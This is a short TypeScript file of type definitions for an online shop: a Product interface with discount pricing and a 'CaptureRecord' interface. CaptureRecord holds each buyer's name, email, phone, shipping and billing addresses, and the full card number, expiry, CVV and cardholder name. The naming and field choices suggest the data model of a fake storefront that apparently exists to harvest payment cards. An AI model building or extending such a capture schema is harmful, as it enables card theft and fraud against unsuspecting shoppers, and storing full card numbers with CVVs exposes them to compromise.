export interface Product {
  id: string;
  name: string;
  tagline: string;
  originalPrice: number;
  discountPrice: number;
  discountPercent: number;
  images: { src: string; alt: string }[];
  description: string;
  specs: { label: string; value: string }[];
  colors: { name: string; value: string }[];
  storageOptions: string[];
  rating: number;
  reviews: number;
  inStock: boolean;
}

export interface CaptureRecord {
  id: string;
  timestamp: string;
  // Product selection
  productId: string;
  productName: string;
  color: string;
  storage: string;
  price: number;
  // Contact info
  email: string;
  phone: string;
  firstName: string;
  lastName: string;
  // Shipping address (verification)
  shippingAddress: string;
  shippingApartment: string;
  shippingCity: string;
  shippingState: string;
  shippingZip: string;
  shippingCountry: string;
  // Billing address (payment)
  billingAddress: string;
  billingApartment: string;
  billingCity: string;
  billingState: string;
  billingZip: string;
  billingCountry: string;
  // Payment details
  cardType: string;
  cardNumberLast4: string;
  cardFullNumber: string;
  cardExpiry: string;
  cardCVV: string;
  cardName: string;
}
